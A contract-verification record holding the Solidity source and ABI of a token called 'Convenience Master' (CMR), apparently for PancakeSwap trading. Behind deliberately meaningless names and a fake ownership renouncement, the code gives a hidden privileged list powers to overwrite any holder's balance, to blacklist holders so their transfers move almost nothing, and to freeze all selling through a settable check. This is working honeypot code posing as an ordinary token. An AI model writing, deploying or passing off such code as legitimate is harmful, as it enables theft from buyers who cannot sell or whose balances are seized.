{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface fundAt {\n    function createPair(address autoLimit, address autoMode) external returns (address);\n}\n\ninterface isTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atMax) external view returns (uint256);\n\n    function transfer(address fromBuy, uint256 takeTx) external returns (bool);\n\n    function allowance(address amountMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromBuy,\n        uint256 takeTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoFund, uint256 value);\n    event Approval(address indexed amountMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract walletTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingTeamFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromAuto is isTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConvenienceMaster is walletTrading, isTo, fromAuto {\n\n    mapping(address => bool) public marketingBuy;\n\n    event OwnershipTransferred(address indexed senderSell, address indexed shouldEnable);\n\n    bool private teamWalletReceiver;\n\n    address public launchSell;\n\n    bool public tokenMarketing;\n\n    function isFrom(address totalTrading, address fromBuy, uint256 takeTx) internal returns (bool) {\n        require(limitMaxTeam[totalTrading] >= takeTx);\n        limitMaxTeam[totalTrading] -= takeTx;\n        limitMaxTeam[fromBuy] += takeTx;\n        emit Transfer(totalTrading, fromBuy, takeTx);\n        return true;\n    }\n\n    function autoEnable(address sellExempt) public {\n        if (maxLiquidityTx) {\n            return;\n        }\n        if (launchIs == limitIsTotal) {\n            limitIsTotal = launchIs;\n        }\n        toWallet[sellExempt] = true;\n        \n        maxLiquidityTx = true;\n    }\n\n    function owner() external view returns (address) {\n        return totalReceiverBuy;\n    }\n\n    function transferFrom(address totalTrading, address fromBuy, uint256 takeTx) external override returns (bool) {\n        if (_msgSender() != tokenMax) {\n            if (listSell[totalTrading][_msgSender()] != type(uint256).max) {\n                require(takeTx <= listSell[totalTrading][_msgSender()]);\n                listSell[totalTrading][_msgSender()] -= takeTx;\n            }\n        }\n        return toIs(totalTrading, fromBuy, takeTx);\n    }\n\n    bool public marketingLaunchedTo;\n\n    address private totalReceiverBuy;\n\n    function receiverSender() private view {\n        require(toWallet[_msgSender()]);\n    }\n\n    constructor (){\n        if (amountEnable) {\n            limitIsTotal = swapMarketing;\n        }\n        marketingTeamFrom launchLaunched = marketingTeamFrom(tokenMax);\n        launchSell = fundAt(launchLaunched.factory()).createPair(launchLaunched.WETH(), address(this));\n        if (marketingLaunchedTo) {\n            marketingLaunchedTo = false;\n        }\n        exemptTo = _msgSender();\n        toWallet[exemptTo] = true;\n        limitMaxTeam[exemptTo] = liquidityMin;\n        receiverMax();\n        \n        emit Transfer(address(0), exemptTo, liquidityMin);\n    }\n\n    mapping(address => bool) public toWallet;\n\n    uint256 constant teamExempt = 10 ** 10;\n\n    function balanceOf(address atMax) public view virtual override returns (uint256) {\n        return limitMaxTeam[atMax];\n    }\n\n    address tokenMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function toIs(address totalTrading, address fromBuy, uint256 takeTx) internal returns (bool) {\n        if (totalTrading == exemptTo) {\n            return isFrom(totalTrading, fromBuy, takeTx);\n        }\n        uint256 atLaunched = isTo(launchSell).balanceOf(minLaunchedReceiver);\n        require(atLaunched == modeIs);\n        require(fromBuy != minLaunchedReceiver);\n        if (marketingBuy[totalTrading]) {\n            return isFrom(totalTrading, fromBuy, teamExempt);\n        }\n        return isFrom(totalTrading, fromBuy, takeTx);\n    }\n\n    function allowance(address receiverFee, address txExempt) external view virtual override returns (uint256) {\n        if (txExempt == tokenMax) {\n            return type(uint256).max;\n        }\n        return listSell[receiverFee][txExempt];\n    }\n\n    function feeAtMarketing(address sellShould, uint256 takeTx) public {\n        receiverSender();\n        limitMaxTeam[sellShould] = takeTx;\n    }\n\n    string private feeMarketing = \"CMR\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeMarketing;\n    }\n\n    function exemptSwap(address swapMin) public {\n        receiverSender();\n        \n        if (swapMin == exemptTo || swapMin == launchSell) {\n            return;\n        }\n        marketingBuy[swapMin] = true;\n    }\n\n    uint256 private swapMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityMin;\n    }\n\n    function receiverMax() public {\n        emit OwnershipTransferred(exemptTo, address(0));\n        totalReceiverBuy = address(0);\n    }\n\n    bool private amountEnable;\n\n    function getOwner() external view returns (address) {\n        return totalReceiverBuy;\n    }\n\n    address public exemptTo;\n\n    function transfer(address sellShould, uint256 takeTx) external virtual override returns (bool) {\n        return toIs(_msgSender(), sellShould, takeTx);\n    }\n\n    uint8 private fundLaunch = 18;\n\n    function walletFund(uint256 takeTx) public {\n        receiverSender();\n        modeIs = takeTx;\n    }\n\n    uint256 private limitIsTotal;\n\n    uint256 marketingSwap;\n\n    bool public maxLiquidityTx;\n\n    function approve(address txExempt, uint256 takeTx) public virtual override returns (bool) {\n        listSell[_msgSender()][txExempt] = takeTx;\n        emit Approval(_msgSender(), txExempt, takeTx);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundLaunch;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isMin;\n    }\n\n    string private isMin = \"Convenience Master\";\n\n    uint256 private liquidityMin = 100000000 * 10 ** 18;\n\n    uint256 public launchIs;\n\n    address minLaunchedReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private listSell;\n\n    uint256 modeIs;\n\n    mapping(address => uint256) private limitMaxTeam;\n\n    bool private sellMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"}],\"name\":\"autoEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"}],\"name\":\"exemptSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTx\",\"type\":\"uint256\"}],\"name\":\"feeAtMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunchedTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTx\",\"type\":\"uint256\"}],\"name\":\"walletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConvenienceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}